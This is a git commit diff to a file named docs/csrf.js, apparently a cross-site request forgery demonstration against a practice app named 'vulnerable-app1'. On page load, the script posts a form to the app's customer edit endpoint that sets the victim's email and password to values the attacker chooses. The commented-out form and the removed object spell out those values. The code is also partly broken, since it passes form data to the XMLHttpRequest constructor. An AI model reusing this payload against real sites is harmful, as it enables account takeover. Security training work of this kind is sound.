d010031b7c508487ce0682a7c5b5520fd11d8014
kotonekurita <kotone.kurita@di-v.co.jp>
2021-03-12 18:34:57 +0900

    fix

--- docs/csrf.js
+++ docs/csrf.js
@@ -2,6 +2,7 @@ window.addEventListener("DOMContentLoaded", () => {
 	// const iframe = document.getElementById("csrf-iframe");
   // const form = iframe.contentWindow.document.querySelector('#csrf-form');
   const form = document.querySelector('#csrf-form');
+  // const form = document.getElementById('csrf-form');
 
 
 //   const formObj = `<form action="https://vulnerable-app1.herokuapp.com/customers/edit" method="post" id="csrf-form" >
@@ -10,13 +11,7 @@ window.addEventListener("DOMContentLoaded", () => {
 //   <input type="hidden" name="customer[password_confirmation]" value="tomcruise" />
 // </form>`;
 
-  const customer = {
-    email: "top@gun",
-    password: "tomcruise",
-    password_confirmation: "tomcruise"
-  };
-
-  const formData = new FormData(customer);
+  const formData = new FormData(form);
   const XHR = new XMLHttpRequest(formData);
     XHR.open("POST", "https://vulnerable-app1.herokuapp.com/customers/edit", true);
     XHR.responseType = "json";
